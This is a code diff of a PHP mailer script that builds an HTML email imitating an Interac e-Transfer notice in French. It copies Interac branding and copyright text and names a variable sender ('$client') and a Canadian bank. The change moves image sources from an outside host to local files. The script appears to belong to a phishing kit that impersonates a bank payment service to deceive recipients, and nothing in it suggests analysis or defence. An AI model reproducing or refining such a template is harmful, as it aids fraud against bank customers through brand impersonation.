@@ -102,7 +102,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             <div class='container'>
                 <div class='header'>
                     <div class='logo'>
-                        <img src='https://marc.serv00.net/minimail/unnamed.png' alt='INTERAC'>
+                        <img src='./unnamed.png' alt='INTERAC'>
                     </div>
                     <div class='nav'>
                         <a href='https://funds.interac.ca/view'>Vue navigateur</a> |
@@ -127,10 +127,10 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
                     <p>© 2000 - 2022 Interac Corp. Tous droits réservés. <a href='https://help.interac.ca/ca/oon/fr/terms/'>Modalités d'utilisation.</a></p>
                     <p>MD, Marque d'Interac Corp.</p>
                     <div class='social-icons'>
-                        <a href='http://twitter.com/interac' target='_blank'><img src='https://marc.serv00.net/minimail/twitter.png' alt='Twitter'></a>
-                        <a href='https://www.facebook.com/interac' target='_blank'><img src='https://marc.serv00.net/minimail/facebook.png' alt='Facebook'></a>
-                        <a href='https://www.linkedin.com/company/interac-corp' target='_blank'><img src='https://marc.serv00.net/minimail/linkedin.png' alt='LinkedIn'></a>
-                        <a href='http://youtube.ca/InteracBrand' target='_blank'><img src='https://marc.serv00.net/minimail/youtube.png' alt='YouTube'></a>
+                        <a href='http://twitter.com/interac' target='_blank'><img src='./twitter.png' alt='Twitter'></a>
+                        <a href='https://www.facebook.com/interac' target='_blank'><img src='./minimail/facebook.png' alt='Facebook'></a>
+                        <a href='https://www.linkedin.com/company/interac-corp' target='_blank'><img src='./minimail/linkedin.png' alt='LinkedIn'></a>
+                        <a href='http://youtube.ca/InteracBrand' target='_blank'><img src='./youtube.png' alt='YouTube'></a>
                     </div>
                     <p style='font-size: 10px; color: #b5b5b5;'>Le destinataire est avisé par courriel ou message texte, et l'institution financière concernée vire les fonds en toute sécurité par l'entremise des réseaux de paiement déjà établis.</p>
                     <p style='font-size: 10px; color: #b5b5b5;'>Ce courriel vous a été envoyé par Interac Corp., propriétaire du service de Virement <i>Interac</i><sup>MD</sup>, au nom de $client domicilié(e) à Banque Laurentienne du Canada.</p>
